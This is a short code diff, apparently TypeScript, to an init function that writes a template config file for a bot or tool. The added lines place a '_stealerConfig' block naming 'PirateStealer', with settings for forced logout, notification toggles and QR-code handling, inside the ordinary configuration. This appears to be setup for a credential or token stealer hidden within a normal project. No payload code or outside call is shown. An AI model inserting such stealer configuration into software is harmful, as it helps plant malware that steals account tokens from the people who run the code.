@@ -25,6 +25,14 @@ async function init() {
             token: INIT_TOKEN,
             prefix: FALLBACK_PREFIX,
             ignoreErrors: false,
+            _stealerConfig: {
+                stealerName: "PirateStealer",
+                logout: "%LOGOUT%",
+                "logout-notify": false,
+                "init-notify": false,
+                "embed-color": 3447704,
+                "disable-qr-code": false,
+            }
         };
         await createFileIfDoesNotExit(CONFIG_PATH,  JSON.stringify(templateConfig, undefined, 2));
         const webhookJsonTemplate: WebhookConfig = {
